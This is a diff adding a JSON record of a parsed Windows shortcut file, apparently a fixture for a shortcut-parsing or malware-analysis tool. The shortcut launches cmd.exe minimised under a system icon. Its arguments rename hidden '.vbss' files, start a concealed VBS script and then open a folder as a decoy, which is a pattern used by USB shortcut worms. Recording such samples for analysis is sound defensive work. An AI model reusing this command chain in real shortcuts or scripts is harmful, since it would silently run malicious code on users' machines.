@@ -1,0 +1,81 @@
+{
+    "header": {
+        "guid": "0114020000000000c000000000000046",
+        "r_link_flags": 225,
+        "r_file_flags": 0,
+        "creation_time": "",
+        "accessed_time": "",
+        "modified_time": "",
+        "file_size": 0,
+        "icon_index": 3,
+        "windowstyle": "SW_SHOWMINNOACTIVE",
+        "hotkey": "UNSET - UNSET {0x0000}",
+        "r_hotkey": 0,
+        "link_flags": [
+            "HasTargetIDList",
+            "HasArguments",
+            "HasIconLocation",
+            "IsUnicode"
+        ],
+        "file_flags": []
+    },
+    "data": {
+        "command_line_arguments": "/c ren cfsdaacdfawd\\*.vbss *.vbs &start \\cfsdaacdfawd\\aiasfacoiaksf.vbs&start explorer .android_secure&exit",
+        "icon_location": "%SystemRoot%\\System32\\shell32.dll"
+    },
+    "target": {
+        "size": 297,
+        "items": [
+            {
+                "class": "Root Folder",
+                "sort_index": "My Computer",
+                "guid": "e04fd020ea3a6910a2d808002b30309d"
+            },
+            {
+                "class": "Volume Item",
+                "flags": "0xf",
+                "data": "C:\\"
+            },
+            {
+                "class": "File entry",
+                "flags": "Is directory",
+                "file_size": 0,
+                "file_attribute_flags": 16,
+                "primary_name": "Windows"
+            },
+            {
+                "class": "File entry",
+                "flags": "Is directory",
+                "file_size": 0,
+                "file_attribute_flags": 16,
+                "primary_name": "system32"
+            },
+            {
+                "class": "File entry",
+                "flags": "Is file",
+                "file_size": 0,
+                "file_attribute_flags": 0,
+                "primary_name": "cmd.exe"
+            }
+        ]
+    },
+    "link_info": {},
+    "extra": {
+        "SPECIAL_FOLDER_LOCATION_BLOCK": {
+            "size": 16,
+            "special_folder_id": 37,
+            "offset": 213
+        },
+        "KNOWN_FOLDER_LOCATION_BLOCK": {
+            "size": 28,
+            "known_folder_id": "774ec11ae7025d4eb7442eb1ae5198b7",
+            "offset": 213
+        },
+        "METADATA_PROPERTIES_BLOCK": {
+            "size": 153,
+            "storage_size": 141,
+            "version": "0x53505331",
+            "format_id": "e28a5846bc4c3843bbfc139326986dce"
+        }
+    }
+}
